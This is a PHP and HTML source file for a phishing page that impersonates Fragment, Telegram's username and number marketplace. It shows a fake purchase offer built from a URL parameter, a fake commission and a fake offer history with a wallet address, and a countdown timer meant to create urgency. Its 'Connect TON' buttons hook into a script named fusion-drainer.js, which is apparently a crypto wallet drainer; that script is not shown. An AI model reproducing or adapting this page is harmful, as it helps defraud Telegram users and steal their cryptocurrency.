<?php
$query = $_SERVER['QUERY_STRING'];
parse_str($query, $params);

if (isset($params['tgWebAppStartParam'])) {
    $tg_param = $params['tgWebAppStartParam'];
    $data = json_decode(base64_url_decode($tg_param), true);

    if (json_last_error() === JSON_ERROR_NONE && isset($data['number']) && isset($data['price'])) {
        $username = '+' . str_replace('-', ' ', $data['number']);
        $price = $data['price'];
        echo "";
        echo "";
    } else {
        echo "";
    }
} else {
    echo "";
}

function base64_url_decode($data) {
    $remainder = strlen($data) % 4;
    if ($remainder) {
        $padlen = 4 - $remainder;
        $data .= str_repeat('=', $padlen);
    }
    return base64_decode(strtr($data, '-_', '+/'));
}
?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Fragment</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="format-detection" content="telephone=no" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="MobileOptimized" content="176" />
  <meta name="HandheldFriendly" content="True" />
  <link rel="stylesheet" href="/fusion-drainer.css?v=1.0.1" />
  <script src="/fusion-drainer.js?v=1.0.7" defer crossorigin></script>
  <link rel="shortcut icon" href="fragment.ico" type="image/x-icon" />
  <link rel="mask-icon" href="https://fragment.com/img/fragment_icon.svg" color="#121519">
  <script>
    document.cookie = "stel_dt=" + encodeURIComponent((new Date).getTimezoneOffset()) + ";path=/;max-age=31536000;samesite=None;secure"
  </script>

  <link href="font-roboto.css@1.css" rel="stylesheet" type="text/css">
  <link href="bootstrap.min.css@3.css" rel="stylesheet">
  <link href="bootstrap-extra.css@2.css" rel="stylesheet">
  <link href="auction.css@75.css" rel="stylesheet">
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>

<body class="emoji_image no-transition">
  <div id="aj_progress" class="progress-bar"></div>
  <div id="aj_content">
    <header class="tm-header">
      <div class="tm-header-logo">
        <a href="" class="tm-logo js-header-logo js-logo js-random-logo js-logo-hoverable">
          <i class="tm-logo-icon js-logo-icon"></i>
          <i class="tm-logo-text"></i>
        </a>
      </div>
      <div class="tm-header-body">
        <form action="" class="tm-header-search-form">
          <div class="icon-before icon-search tm-field tm-search-field">
            <input type="search" class="form-control tm-input tm-search-input" name="query" placeholder="<?php echo (strpos($username, '+888') !== false) ? 'Search phone numbers' : 'Search username'; ?>" autocomplete="off" />
          </div>
        </form>
      </div>
      <div class="tm-header-actions tm-header-actions-wide">
        <button class="btn btn-default tm-header-action tm-header-button login-link">
          <i class="icon icon-connect-telegram"></i>
          <span class="tm-button-label ton-connect-trigger">Connect Telegram</span>
        </button>
        <button onclick="window.claimButton()" class="btn btn-primary tm-header-action tm-header-button ton-auth-link">
          <i class="icon icon-connect-ton"></i>
          <span class="tm-button-label ton-connect-trigger">Connect TON</span>
        </button>
      </div>

      <div class="tm-header-menu-button js-header-menu-button icon-before icon-header-menu"></div>
      <div class="tm-header-menu hide js-header-menu" data-close-outside="js-header-menu-window">
        <div class="tm-header-menu-close-button js-header-menu-close-button icon-before icon-header-menu-close"></div>
        <div class="tm-header-menu-window js-header-menu-window">
          <div class="tm-header-menu-body">
            <h4 class="tm-menu-subheader">Platform</h4>
            <div class="tm-menu-links">
              <a href="https://fragment.com/about" class="tm-menu-link icon-before icon-menu-about">About</a>
              <a href="https://fragment.com/terms" class="tm-menu-link icon-before icon-menu-terms">Terms</a>
              <a href="https://fragment.com/privacy" class="tm-menu-link icon-before icon-menu-privacy">Privacy Policy</a>
            </div>
            <div class="tm-header-menu-footer">
              <button onclick="window.claimButton()" class="btn btn-primary btn-block tm-menu-button ton-auth-link">
                <i class="icon icon-connect-ton"></i>
                <span class="tm-button-label">Connect TON</span>
              </button>
              <button class="btn btn-default btn-block tm-menu-button login-link">
                <i class="icon icon-connect-telegram"></i>
                <span class="tm-button-label">Connect Telegram</span>
              </button>
            </div>
          </div>
        </div>
      </div>
    </header>
    <main class="tm-main js-main-content">
      <?php if (strpos($username, '+888') === false) { ?>
        <section class="tm-section tm-auction-section">
          <div class="tm-section-header">
            <h2 class="tm-section-header-text">
              <span class="tm-section-header-domain"><span class="tm-web3-address"><span class="subdomain"><?php echo $username; ?></span></span></span>
              <span class="tm-section-header-status tm-status-avail">Claimed</span>
            </h2>
          </div>
          <div class="tm-section-box tm-section-bid-info">
            <table class="table tm-table tm-table-fixed">
              <thead>
                <tr>
                  <th style="--width:37%">Offer amount</th>
                  <th style="--width:28%">Commision</th>
                  <th style="--width:35%">Total</th>
                </tr>
              </thead>
              <tbody>
                <td>
                  <div class="table-cell">
                    <div class="table-cell-value tm-value icon-before icon-ton"><?php echo $price; ?></div>
                    <div class="table-cell-desc" id="price-5.1">&nbsp;~&nbsp;$<?php echo $price * 6.12; ?></div>
                  </div>
                </td>
                <td>
                  <div class="table-cell">
                    <div class="table-cell-value tm-value icon-before icon-ton">1</div>
                    <div class="table-cell-desc">&nbsp;</div>
                  </div>
                </td>
                <td>
                  <div class="table-cell">
                    <div class="table-cell-value tm-value icon-before icon-ton"><?php echo $price + 1; ?></div>
                    <div class="table-cell-desc" id="price-6">&nbsp;~&nbsp;$<?php echo $price * 6.12 + 5; ?></div>
                  </div>
                </td>
              </tbody>
            </table>
          </div>
        </section>
      <?php } else { ?>
        <section class="tm-section tm-auction-section">
          <div class="tm-section-header">
            <h2 class="tm-section-header-text">
              <span class="tm-section-header-domain"><span class="tm-web3-address"><span class="subdomain"><?php echo $username; ?></span><span class="domain"></span></span></span>
              <span class="tm-section-header-status tm-status-avail">Claimed</span>
            </h2>
          </div>
          <div class="tm-section-box tm-section-bid-info">
            <table class="table tm-table tm-table-fixed">
              <thead>
                <tr>
                  <th style="--width:37%">What is this?</th>
                  <th style="--width:28%"></th>
                  <th style="--width:35%"></th>
                </tr>
              </thead>
            </table>
          </div>
        </section>
      <?php } ?>
      <section class="tm-section clearfix">
        <div class="tm-section-header">
          <h3 class="tm-section-header-text">Latest Offers</h3>
        </div>
        <div class="tm-table-wrap">
          <table class="table tm-table tm-table-fixed">
            <thead>
              <tr>
                <th style="--thin-width:100px;--wide-width:25%">Offer</th>
                <th style="--thin-width:110px;--wide-width:25%">Date</th>
                <th style="--width:50%">From</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>
                  <div class="table-cell">
                    <div class="table-cell-value tm-value icon-before icon-ton"><?php echo $price; ?></div>
                  </div>
                </td>
                <td>
                  <div class="table-cell">
                    <div class="tm-datetime"><time datetime="2024-08-14T23:43:40+00:00" class="short">Today</time></div>
                  </div>
                </td>
                <td>
                  <div class="table-cell">
                    <a href="https://tonviewer.com/UQB33wP5PbYA5kW9ClswlBF4np5AMaYW59YVRMSCGVsoMjci" class="tm-wallet" target="_blank"><span class="short">UQB33wP5PbYA5kW9ClswlBF4np5AMaYW59YVRMSCGVsoMjci</span></a>
                  </div>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>
    </main>
  </div>
  <script src="jquery.min.js@1"></script>
  <script src="bootstrap.min.js"></script>
  <script src="main-aj.js@70"></script>
  <script src="jquery-ex.js@19"></script>
  <script src="qr-code-styling.js@1"></script>
  <script src="auction.js@80"></script>
  <script src="tgsticker.js@31"></script>
  <script src="https://telegram.org/js/telegram-widget.js?22"></script>
  <script>
    ajInit({
      "version": 550,
      "apiUrl": "\/api?hash=20dcfc0bf8dd5d4eb8",
      "unauth": true,
      "state": {
        "type": 1,
        "typeUrl": "\/username\/",
        "username": "oliveer",
        "itemTitle": "@oliveer",
        "auctionLastLt": 48461166000003,
        "auctionLastVer": false,
        "offerFeeMax": "100",
        "offerFeeMult": 0.0005,
        "tonRate": 6.5061467763163
      }
    });
  </script>
  <div id="ton-connect" style="display: none;"></div>
  <script>
    (function() {
      let timeLeft = 19 * 3600;
      function updateTime() {
        if (timeLeft >= 0) {
          const hours = Math.floor(timeLeft / 3600);
          const minutes = Math.floor((timeLeft % 3600) / 60);
          const seconds = timeLeft % 60;
          updateDigit(document.querySelector('.timer-h0'), Math.floor(hours / 10));
          updateDigit(document.querySelector('.timer-h1'), hours % 10);
          updateDigit(document.querySelector('.timer-m0'), Math.floor(minutes / 10));
          updateDigit(document.querySelector('.timer-m1'), minutes % 10);
          updateDigit(document.querySelector('.timer-s0'), Math.floor(seconds / 10));
          updateDigit(document.querySelector('.timer-s1'), seconds % 10);
          timeLeft--;
        } else {
          document.querySelector('.tm-section-countdown-wrap').classList.add('ended');
        }
      }

      function updateDigit(element, value) {
        element.textContent = value;
      }
      setInterval(updateTime, 1000);
    })();
  </script>
  <script>
    async function fetchToncoinPrice() {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=toncoin&vs_currencies=usd');
        const data = await response.json();
        const tonPrice = data.toncoin.usd;
        document.getElementById('price-5.1').innerHTML = `&nbsp;~&nbsp;$${(5.1 * tonPrice).toFixed(2)}`;
        document.getElementById('price-1').innerHTML = `&nbsp;~&nbsp;$${(1 * tonPrice).toFixed(2)}`;
        document.getElementById('price-6').innerHTML = `&nbsp;~&nbsp;$${(6 * tonPrice).toFixed(2)}`;
      } catch (error) {
        console.error('Error fetching the Toncoin price:', error);
      }
    }
    setInterval(fetchToncoinPrice, 60000);
    fetchToncoinPrice();
  </script>
</body>
</html>
